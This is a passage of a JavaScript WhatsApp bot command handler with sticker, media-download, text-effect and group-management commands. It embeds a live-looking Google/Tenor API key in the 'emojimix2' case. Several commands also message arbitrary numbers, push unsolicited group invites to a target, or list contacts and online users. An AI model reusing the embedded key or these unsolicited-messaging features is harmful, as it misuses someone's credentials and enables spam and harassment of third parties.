}
break
//=================================================//
case 'emojimix2': {
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
m.reply('Sabar Cuy Loading')
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(from, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
//=================================================//
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(from, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
m.reply('Sabar Cuy Loading')
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
haikal.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(from, ko, { quoted:m })
}
break
case 'getname': {
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isPrem) return replyprem(mess.premium)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isPrem) return replyprem(mess.premium)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(from, teks, m)
}
break
case 'penjara':
if (!isPrem) return replyprem(mess.premium)
if (!q) return m.reply(`*Contoh* :\n#penjara Haikal [ Lu Sambil Replay Si nmr Target `)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'mediafire': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*HW MODS WA*`
m.reply(`${result4}`)
haikal.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'warning': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Harap segera melakukan topup saldo untuk renew/perpanjang server di panel amgeekz.site, 1-3 hari apabila server tidak di perpanjang akan langsung di hapus oleh admin` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break



case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
 if (!isPrem) return replyprem(mess.premium)
  if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
m.reply('Sabar Cuy Loading')
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
if (!isPrem) return replyprem(mess.premium)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
if (!isPrem) return replyprem(mess.premium)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'drapwater': case 'water':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if (!isPrem) return replyprem(mess.premium)
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
if (!isPrem) return replyprem(mess.premium)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (!isPrem) return replyprem(mess.premium)
let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
haikal.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'q': case 'quoted': {
if (!isPrem) return replyprem(mess.premium)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(from, true)
}
break
//=================================================//
case 'listpc': {
if (!isPrem) return replyprem(mess.premium)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isPrem) return replyprem(mess.premium)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
if (!isPrem) return replyprem(mess.premium)
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isPrem) return replyprem(mess.premium)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'sendlinkgc': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await haikal.groupInviteCode(from)
haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
break

case 'linkgroup': case 'linkgc': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await haikal.groupInviteCode(from)
haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
haikal.groupRevokeInvite(from)
break
//=================================================//
case 'tagall': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (!isPrem) return replyprem(mess.premium)
db.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
}
}
break
//=================================================//
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isPrem) return replyprem(mess.premium)
haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//=================================================//
       case 'group': case 'grup': {       
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args[0] === 'close'){
    await haikal.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await haikal.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(from, buttons, `Mode Group`, haikal.user.name, m)

     }
    }
    break
//=================================================//
    case 'editinfo': {
if (!isPrem) return replyprem(mess.premium)
